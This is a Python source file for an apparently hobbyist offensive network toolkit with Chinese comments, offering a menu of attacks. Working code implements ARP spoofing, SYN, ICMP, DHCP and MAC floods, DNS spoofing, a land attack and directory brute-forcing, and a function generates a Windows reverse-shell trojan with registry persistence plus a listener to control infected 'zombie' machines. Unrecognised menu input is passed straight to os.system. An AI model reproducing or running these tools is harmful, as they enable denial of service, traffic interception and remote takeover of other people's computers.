#The program must be run in utf-8. 必须以UTF-8编码运行程序。
import time
tick = time.time()
try:
    from scapy.all import *#要用的模块有scapy没有就在命令行跑这条命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy
    from scapy.utils import PcapReader, PcapWriter
except:
    print("你是不是忘了安装scapy模块")
    print("scapy安装命令windows:python -m pip install scapy liunx:sudo python -m pip install scapy")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    import nmap
except:
    print("你是不是忘了安装python-nmap模块")
    print("请先在nmap的官网下载nmap www.nmap.org")
    print("如何执行指令windows:python -m pip install python-nmap liunx:sudo python -m pip install python-nmap")
    import sys
    input("按回车退出")
    sys.exit(0)

try:
    import requests
except:
    print("你是不是忘了安装requests模块")
    print("如何执行指令windows:python -m pip install requests liunx:sudo python -m pip install requests")
    import sys
    input("按回车退出")
    sys.exit(0)
try:
    import progressbar
except:
    print("你是不是忘了安装progressbar模块")
    print("如何执行指令windows:python -m pip install progressbar liunx:sudo python -m pip install progressbar")
    import sys
    input("按回车退出")
    sys.exit(0)

import random, sys, uuid, os, logging#导入需要的自带模块
import socket as sk

print("[+]init the log system.")
file = open('log.log','w')
file.close()
LOG_FORMAT = "%(asctime)s:%(levelname)s:%(message)s"
logging.basicConfig(level=logging.DEBUG,format=LOG_FORMAT,filename='log.log')
logging.info("log system init done.")
print("[+]log system init...Done")

chinses_mode = False
argv = sys.argv
for i in argv:
    logging.info("read the argv.")
    if i == "--help" or i == "-h":
        print("python run.py [-G] [-z]")
        print("use -G run in GUI mode.")
        print("use -z run in chinese mode.")
        sys.exit(0)
    elif i == "-G":
        logging.info("run in GUI mode.")
        logging.info("stop record the log.")
        import GUI
    elif i == "-z":
        chinses_mode = True
        logging.info("run in GUI mode.")
    else:
       logging.warning("can not deal with the argv " + str(i) + ".") 

print("The program must be run in utf-8.")#不知道为什么总有人用其他编码导致中文出问题。
print("必须以UTF-8编码运行程序")
print("所有模块都可以按ctrl + c 退出")#为什么还有人不知道ctrl + c的神奇组合

mac=uuid.UUID(int = uuid.getnode()).hex[-12:]#获取本机MAC地址
mac = ":".join([mac[e:e+2] for e in range(0,11,2)])
print(mac)

file = open("color.setting",'r')#让用户可以选择程序运行时的颜色
color = file.read()#读取文件
os.system("color " + color)#用os.system()改变颜色

print("                                   /$$                  /$$    /$$$$$$    /$$    /$$$$$$ ")
print("                                  | $$                /$$$$   /$$__  $$ /$$$$   /$$__  $$")
print("/$$$$$$/$$$$   /$$$$$$   /$$$$$$ | $$   /$$  /$$$$$$|_  $$  | $$  \__/|_  $$  | $$  \__/ ")
print("| $$_  $$_  $$ |____  $$ /$$__  $$| $$  /$$/ /$$__  $$ | $$  | $$$$$$$   | $$  | $$$$$$$ ")
print("| $$ \ $$ \ $$  /$$$$$$$| $$  \__/| $$$$$$/ | $$  \ $$ | $$  | $$__  $$  | $$  | $$__  $$")
print("| $$ | $$ | $$ /$$__  $$| $$      | $$_  $$ | $$  | $$ | $$  | $$  \ $$  | $$  | $$  \ $$")
print("| $$ | $$ | $$|  $$$$$$$| $$      | $$ \  $$|  $$$$$$//$$$$$$|  $$$$$$/ /$$$$$$|  $$$$$$/")
print("|__/ |__/ |__/ \_______/|__/      |__/  \__/ \______/|______/ \______/ |______/ \______/ ")
print("+-------------------------------------+------------------------+")
print("|  MEN                                |  STR                   |")
print("+-------------------------------------+------------------------+")
print("|   0x000189abaa                      |         MOV 540 ACC    |")
print("|   0x000189abab                      |         PYTHON         |")
print("+-------------------------------------+------------------------+")
print("|             github:www.github.com/marko1616                  |")
print("+--------------------------------------------------------------+")
print("|          bilibili:space.bilibili.com/385353604               |")
print("+--------------------------------------------------------------+")

print("loding plugins...")

plugins_list = []
plugins_dir = os.path.join(os.getcwd() + '/plugins')
sys.path.append(os.getcwd() + '/plugins')

for (dirpath, dirnames, filenames) in os.walk(plugins_dir):
    for plugins_name in filenames:
        if os.path.splitext(plugins_name)[1] == '.py':
            try:
                exec("import " + os.path.splitext(plugins_name)[0])
            except SyntaxError:
                logging.error("can not import the plugins '" + str(os.path.splitext(plugins_name)[0]) + "'.")
                continue
            print("import " + os.path.splitext(plugins_name)[0] + "...Done")
            plugins_list.append(os.path.splitext(plugins_name)[0])

print("plugins loding...Done")
print("password list loding...")

password_list = []
file = open('pass.txt','r')
for i in file:
    password_list.append(i)
file.close()

print("password list read...Done")

file = open("server_dir_dictionary.txt",'r',encoding='utf-8')#读取服务器后台目录字典
server_dir_dictionary = []
for i in file:
    server_dir_dictionary.append("/" + i.replace("\n",""))#一定要替换\n
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.87 Safari/537.36'}
progress = progressbar.ProgressBar()
class ARP_poof():
    def ARP_poof_with_not_ARPping(self):#ARP欺骗不带ARPPing

        if chinses_mode:
            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
            router = input("请输入网关IP地址:")
        else:
            target = input("Enter the target IP like 127.0.0.1:")
            router = input("Please enter the router IP address like 192.168.1.1:")

        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
        packet_two = Ether()/ARP(psrc=target,pdst=router)

        while True:#攻击主循环
            try:
                sendp(packet)
                sendp(packet_two)
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def ARP_poof(self): #ARP欺骗带ARPPing(内网用)。 PS:ARPPing用来确认主机是否存活

        if chinses_mode:
            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
            router = input("请输入网关IP地址:")
        else:
            target = input("Enter the target IP like 127.0.0.1:")
            router = input("Please enter the router IP address like 192.168.1.1:")

        arp_Ping_fall = False#初始化变量
        arp_test = False
        arp_test_two = False

        print("Try to arpPing the target...")
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=target),timeout=1000)#ARPPing(arp目标扫描) PS:不知道为什么有时会失效。
        for snd,rcv in ans:
            print("arpPing...Done")
            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
            arp_test = True

        print("Try to arpPing the router...")
        ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff;ff")/ARP(pdst=router),timeout=1000)#康康上面的注释。
        for snd,rcv in ans:
            print("arpPing...Done")
            print(rcv.sprintf("%Ether.src% - %ARP.psrc%"))
            arp_test_two = True

        if arp_test == False or arp_test_two == False:
            arp_Ping_fall = True
            print("ARP ping fall.")

        packet = Ether()/ARP(psrc=router,pdst=target)#生成攻击数据包
        packet_two = Ether()/ARP(psrc=target,pdst=router)

        while True:#攻击主循环
            try:
                if arp_Ping_fall:
                    break
                sendp(packet)
                sendp(packet_two)
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def ARP_poof_with_fake_MAC(self):
        if chinses_mode:
            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
            router = input("请输入网关IP地址:")
            redirect_MAC = input("请输入你想要把数据包重定向到的MAC:")
        else:
            target = input("Enter the target IP like 127.0.0.1:")
            router = input("Please enter the router IP address like 192.168.1.1:")
            redirect_MAC = input("Please enter redirect MAC:")

        packet = Ether()/ARP(psrc=target,pdst=router,hwsrc=redirect_MAC)
        packet_two = Ether()/ARP(psrc=router,pdst=target,hwsrc=redirect_MAC)

        while True:#攻击主循环
            try:
                sendp(packet)
                sendp(packet_two)
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def ARP_poof_just_target(self):
        if chinses_mode:
            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
            router = input("请输入网关IP地址:")
        else:
            target = input("Enter the target IP like 127.0.0.1:")
            router = input("Please enter the router IP address like 192.168.1.1:")

        packet = Ether()/ARP(psrc=router,pdst=target)

        while True:#攻击主循环
            try:
                sendp(packet,verbose=False)
                time.sleep(1)
            except KeyboardInterrupt:
                break

    def ARP_poof_just_router(self):
        if chinses_mode:
            target = input("请输入目标IP地址:")  # 目标输入不用我多说把。
            router = input("请输入网关IP地址:")

        else:
            target = input("Enter the target IP like 127.0.0.1:")
            router = input("Please enter the router IP address like 192.168.1.1:")

        packet = Ether()/ARP(psrc=target,pdst=router)

        while True:#攻击主循环
            try:
                sendp(packet,verbose=False)
                time.sleep(1)
            except KeyboardInterrupt:
                break

def SYN_flood(): #SYN flood attack SYN洪水不用我说把
    if chinses_mode:
        target = input("请输入目标IP:")  # 必须有的目标输入。
        port = input("请输入目标端口:")  # 攻击端口
    else:
        target = input("Enter the target IP like 127.0.0.1:")#必须有的目标输入。
        port = input("enter port:")#攻击端口

    while True:#攻击主循环
        try:#一个ctrl + c退出模块自己体会
            send(IP(src=RandIP(),dst=target)/TCP(dport=int(port), flags="S"),verbose=False)#生成&发送攻击数据包
        except KeyboardInterrupt:
            break
        except OSError:
            logging.error("the tarrget IP is not confrom to the IP format.user input IP is '" + str(target) + "'.")
            if chinses_mode:
                print("你输入的地址不符合IP格式。")
                time.sleep(1)
                break
            else:
                print("The address you entered does not conform to the IP format.")
                time.sleep(1)
                break

def nmap_port_scan():#nmap扫描所有端口状态
    if chinses_mode:
        target = input("请输入目标IP地址或网段IP地址:")
    else:
        target = input("Enter the target IP like 127.0.0.1:")
    nm = nmap.PortScanner()
    tick = time.time()
    nm.scan(target, '1-9999')
    if chinses_mode:
        print("扫描使用了", time.time() - tick, "秒。")
    else:
        print("scan in ", time.time() - tick, "seconds.")
    for host in nm.all_hosts():#在nmap的扫描结果里的所有主机进行分析
        print('-----------------------------------')
        print('Host:%s(%s)'%(host,nm[host].hostname()))#打印计算机名称
        print('State:%s'%nm[host].state())
        for proto in nm[host].all_protocols():
            print('-----------------------------------')
            print('Protocol:%s'%proto)
            lport = list(nm[host][proto].keys())
            for port in lport:
                print('port:%s\tstate:%s'%(port,nm[host][proto][port]['state']))

def DHCP_flood():
    packet = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src="0.0.0.0",dst="255.255.255.255")/UDP(sport=68,dport=67)/BOOTP(options=[("message-type","discover"),"end"])
    while True:
        try:
            srp(packet,verbose=False)
            time.sleep(1)
        except KeyboardInterrupt:
            break

def death_ping():
    if chinses_mode:
        target = input("请输入目标IP:")
    else:
        target = input("Enter the target like 127.0.0.1:")
    while True:
        send(IP(src=target,dst=RandIP())/ICMP(),verbose=False)

def scapy_sniff():
    file = open('iface.setting','r')
    iface = file.read()
    file.close()

    if iface == 'None':
        data = sniff(prn=lambda x:x.summary())#scapy的sniff嗅探
    else:
        data = sniff(iface=iface,prn=lambda x:x.summary())

    if chinses_mode:
        print("开始保存数据包...")
    else:
        print("Start analyzing packets...")
    file = "sniff_data/" + time.strftime('%Y_%m_%d_%H_%M_%S') + ".pcap"
    writer = PcapWriter(file, append = True)
    for i in data:
        writer.write(i)
    writer.flush()
    writer.close()

def read_pcap():
    if chinses_mode:
        print("请输入pcap文件名:")
    else:
        file_name = input("Enter the pcap file name like 2019_11_02_16_55_22.pcap:")#输入pcap文件名
    file_name = "sniff_data/" + file_name#组合文件路径

    try:
        reader = PcapReader(file_name)#用scapy打开pcap文件
    except FileNotFoundError:
        if chinses_mode:
            print("找不到文件")
        else:
            print("Can nod find the file")
        return

    packets = reader.read_all(-1)#读取所有储存的数据包
    for i in packets:#循环数据包列表
        i.show()#打印数据包

def macof():
    while True:
        try:
            packet = Ether(src=RandMAC(),dst=RandMAC())/IP(src=RandIP(),dst=RandIP())/ICMP()
            time.sleep(0.01)
            sendp(packet,verbose=False)
        except KeyboardInterrupt:
            break

def Generate_trojan_virus():
    if chinses_mode:
        name = input("请输入病毒名:")
        lhost = input("请输入你想让病毒连接的主机IP:")
        lport = input("请输入主机端口:")
    else:
        name = input("Enter virus name:")
        lhost = input("Enter connect host:")
        lport = input("Enter connect port:")
    file = open("virus/" + name + ".py",'w')
    file.write('import socket, os, time\n')
    file.write('os.system("REG ADD HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v lol /t REG_SZ /d " + os.getcwd() + "\\\\' + name + '.exe /f")\n')#你好你的注册表被xx了
    file.write('s = socket.socket()\n')
    file.write('s.connect(("' + lhost + '",' + lport + '))\n')
    file.write('while True:\n')
    file.write('    command = s.recv(2048)\n')
    file.write('    data = os.popen(command.decode("utf-8")).read()\n')
    file.write('    if data == "":\n')
    file.write('        data = "command has no output or has a error."\n')
    file.write('    s.send(bytes(data,encoding="utf-8"))\n')
    file.close()
    os.system("pyinstaller -F virus/" + name + ".py")

def countrol_zombie_computer():
    if chinses_mode:
        listen_host = input("请输入你的IP:")
        listen_port = input("请输入你连接的端口:")
    else:
        listen_host = input("Enter the listen host ip like 127.0.0.1:")
        listen_port = input("Enter the listen port like 80:")
    s = socket.socket()
    s.bind((listen_host,int(listen_port)))
    s.listen(1)
    print("Wait for connect...")
    conn,address = s.accept()
    print("have a new connect from",address[0])
    while True:
        command = input("Enter the command:")
        conn.send(bytes(command,encoding="utf-8"))
        data = conn.recv(4096)
        print(data.decode("utf-8"))

def trace_router():
    dport = []
    if chinses_mode:
        target = input("请输入目标域名或IP地址:")
        dport.append(int(input("请输入端口:")))
    else:
        target = input("Enter the target IP or domain:")
        dport.append(int(input("Enter the connect port:")))
    res, unans = traceroute(target, dport=dport, retry=-2)
    time.sleep(1)

def DNS_pollution():
    if chinses_mode:
        dst_ip = input("请输入需要导向的IP:")
    else:
        dst_ip = input(":")
    while True:
        try:
            send(IP(dst=dst_ip, src="192.168.3.1")/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="s96.cnzz.com")), verbose=0)
        except KeyboardInterrupt:
            break

def land_attack():
    if chinses_mode:
        target = input("请输入目标IP:")
    else:
        target = input("Enter the target IP:")
    while True:
        try:
            send(IP(src=target, dst=target)/TCP(sport=135, dport=135),verbose=False)
        except KeyboardInterrupt:
            break
        except OSError:
            logging.error("the tarrget IP is not confrom to the IP format.user input IP is '" + str(target) + "'.")
            if chinses_mode:
                print("你输入的地址不符合IP格式。")
                time.sleep(1)
                break
            else:
                print("The address you entered does not conform to the IP format.")
                time.sleep(1)
                break

def Server_background_scan():
    dir_find = []
    if chinses_mode:
        target = input("请输入目标IP或域名:")
        http_or_https = input("使用HTTP协议还是HTTPS协议(1 http,2 https)")
    else:
        target = input("Enter the target IP or domain:")
        http_or_https = input("You want to use http or https?(1 http,2 https)")
    if http_or_https == "1":
        http = True
    elif http_or_https == "2":
        http = False
    else:
        logging.WARNING("user do not choose use http or https.")
        if chinses_mode:
            print("你没有选择是用http还是https")
        else:
            print("You have no choice whether to use HTTP or HTTPS.")
        return
    for i in progress(server_dir_dictionary):
        if http:
            r = requests.get("http://" + target + i,headers=headers)
        else:
            r = requests.get("https://" + target + i,headers=headers)
        if r.status_code == 200:
            dir_find.append(target + i)
    for i in dir_find:
        if chinses_mode:
            print("目录:" + i + " 响应为200")
        else:
            print("dir:" + i + " response is 200.")

if chinses_mode:
    print("启动用了", time.time() - tick, "秒。")
else:
    print("Setup in ", time.time() - tick, "seconds.")#初始化计时

arps_poof = ARP_poof()

while True:#喜闻乐见的主循环
    os_command = False
    tool_number = 15
    if chinses_mode:
        print("如果要选择插件请输入插件名字")

    if not chinses_mode:
        print("quit(0)")#告诉用户对应的功能
        print("ARPspoof(1)")
        print("SYN flood(2)")
        print("All port status scans(3)")
        print("Death of Ping(4)")
        print("Sniff(5)")
        print("Read Save pcap file(6)")
        print("macof(7)")
        print("DHCP flood(8)")
        print("Generate trojan virus(9)")
        print("Control zombie computer(10)")
        print("Trace router(11)")
        print("DNS pollution(12)")
        print("land attack(13)")
        print("server background scan(14)")
    if chinses_mode:
        print("退出(0)")
        print("ARP欺骗(1)")
        print("SYN洪水(2)")
        print("所有端口状态扫描(3)")
        print("死亡之Ping(4)")
        print("sniff嗅探(5)")
        print("读取已保存的pcap文件 注:推荐使用Wireshark(6)")
        print("伪macof(7)")
        print("DHCP洪水(8)")
        print("生成木马病毒(9)")
        print("控制肉鸡(10)")
        print("路由跟踪(11)")
        print("DNS污染(12)")
        print("land攻击(这个攻击很古老了 13)")
        print("服务器后台扫描(14)")
    if chinses_mode:
        print("--------------------插件--------------------")
    else:
        print("------------------pulgins-------------------")
    for i in plugins_list:
        print(i + "(" + str(tool_number) + ")")
        tool_number = tool_number + 17

    choose = input(">>>")#用户选择输入
    try:#如果是数字输入就转为int类
        choose = int(choose)
    except:
        pass

    if choose == 0:#无聊的判断时间 PS:这里想吐槽python没有什么关键字你知道了把。
        logging.info("user want to exit the program.")
        sys.exit(0)
    elif choose == 1:#时刻提醒自己要两的等于号。
        if chinses_mode:
            print("ARP欺骗带ARPPing(1)")
            print("ARP欺骗(2)")
            print("ARP欺骗使用假的MAC(不能用来中间人 3)")
            print("ARP欺骗只影响目标(4)")
            print("ARP欺骗只影响网关(5)")
        else:
            print("ARP poof with ARP ping(1)")
            print("ARP poof(2)")
            print("ARP poof with fake MAC(3)")
            print("ARP poof just poof target(4)")
            print("ARP poof just poof router(5)")

        choose = input(">>>")

        try:
            choose = int(choose)
        except ValueError:
            if chinses_mode:
                print("请输入数字")
            else:
                print("You must enter a int")


        if choose == 1:
            arps_poof.ARP_poof()
        elif choose == 2:
            arps_poof.ARP_poof_with_not_ARPping()
        elif choose == 3:
            arps_poof.ARP_poof_with_fake_MAC()
        elif choose == 4:
            arps_poof.ARP_poof_just_router()
        elif choose == 5:
            arps_poof.ARP_poof_just_router()

    elif choose == 2:#没一个选择对应一个函数
        SYN_flood()
    elif choose == 3:
        nmap_port_scan()
    elif choose == 4:
        death_ping()
    elif choose == 5:
        scapy_sniff()
    elif choose == 6:
        read_pcap()
    elif choose == 7:
        macof()
    elif choose == 8:
        DHCP_flood()
    elif choose == 9:
        Generate_trojan_virus()
    elif choose == 10:
        countrol_zombie_computer()
    elif choose == 11:
         trace_router()
    elif choose == 12:
        DNS_pollution()
    elif choose == 13:
        land_attack()
    elif choose == 14:
        Server_background_scan()
    else:
        os_command = True

    for i in plugins_list:
        if choose == i:
            exec(i + ".run()")
            os_command = False

    if os_command:#如果不是选项就当作系统命令
        logging.info("user run the command " + str(choose) + ".")
        os.system(str(choose))
        time.sleep(2)
    else:
        logging.info("user choose the tool " + str(choose) + " to attack Done.")
